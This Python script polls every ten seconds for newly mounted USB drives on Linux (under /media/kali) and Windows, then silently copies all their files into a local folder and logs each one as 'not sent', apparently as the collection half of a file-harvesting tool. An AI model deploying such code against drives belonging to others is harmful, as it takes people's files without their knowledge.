import platform
import shutil
from pathlib import Path
from time import sleep

from logzero import logfile, logger

from utils import *

logfile("client.log")
OS = platform.system()


def list_pdfs(path: Path):
    pdf_files = []
    for subpath in path.iterdir():
        try:
            if subpath.is_dir():
                pdf_files += list_pdfs(subpath)
                continue
        except:
            logger.warning(f"Cannot access {subpath}.")
        # Not really checking for pdfs...
        if subpath.suffix == ".pdf":
            pdf_files.append(subpath)
    return pdf_files

def backup(pen_drive: Path, path: Path):
    already_back_up = get_all_files()

    for subpath in pen_drive.iterdir():
        if subpath.is_dir():
            backup(subpath, path)
        elif subpath.is_file() and str(subpath) not in already_back_up:
            filename = subpath.name
            shutil.copy(str(subpath.resolve()), str((path / filename).resolve()))
            add_file(str((path/filename).resolve()), status="not sent")


def get_usb_devices():
    # TODO: Works only if OS mounts automatically media and drives.
    usb_devices = set()

    if OS == "Linux":
        path = Path("/media/kali")
        for subpath in path.iterdir():
            if subpath.is_dir():
                usb_devices.add(subpath)
    elif OS == "Windows":
        for letter in "DEFGHIJKLMNOPQRSTUVWXYZ":
            path = Path(f"{letter}:\\")
            if path.is_dir():
                usb_devices.add(path)

    return usb_devices

def main_task():
    backup_folder = Path("./backup/")
    if not backup_folder.is_dir():
        backup_folder.mkdir()
        logger.info("Backup folder created successfully!")

    pen_drives = get_usb_devices()
    logger.info(f"Pen drives located: {''.join(map(str, pen_drives))}.")

    while True:
        sleep(10)

        new_pen_drives = get_usb_devices().difference(pen_drives)
        if len(new_pen_drives) != 0:
            logger.info(f"New pen drives: {'\n- '.join(map(str, new_pen_drives))}.")
        else:
            logger.warning("No new pen drive.")
        for pen_drive in new_pen_drives:
            logger.info(f"Saving files from {pen_drive}...")
            backup(pen_drive, backup_folder)
            logger.info("Files saved successfully!")
            pen_drives.add(pen_drive)
